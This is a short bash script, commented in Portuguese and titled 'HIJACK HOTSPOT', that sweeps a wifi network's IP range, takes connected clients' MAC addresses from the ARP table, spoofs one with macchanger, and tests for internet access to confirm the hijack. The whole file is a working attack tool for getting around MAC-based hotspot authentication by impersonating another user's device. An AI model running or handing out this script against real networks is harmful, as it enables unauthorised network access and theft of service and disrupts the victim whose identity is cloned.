#!/bin/bash

cont=1

if [ "$1" == "" ] #testa o argumento
then
        echo "Siga o exemplo abaixo para passagem de parametros. INTERFACE + SSID + RANGE IP"
        echo "$0 [wlan1 | wlan0] SSID 192.168.1."

else

	echo "#################################"
	echo "######### HIJACK HOTSPOT ########"
	echo "#################################"
	
	iwconfig $1 essid $2
	
	while [ $cont -lt 254 ]; do
		ip_target=$3$cont;
		ping $ip_target -c1;
		mac_target=$(arp -n | grep $ip_target | grep -v incomplete | awk '{print $3}');

		if [ -z $mac_target]
		then
			let cont=cont+1
		else
			ifconfig $1 down
			macchanger $1 --mac $mac_target
			ifconfig $1 up
			iwconfig $1 essid $2
			
			ping -c1 -w1 8.8.8.8 >/dev/null
     			if [ $? -eq 0 ] 
			then
       				echo "\n [+] Hijack efetuado com sucesso!\n"
				cont=255
			else
				let cont=cont+1
     			fi
		fi
		
	done;

fi
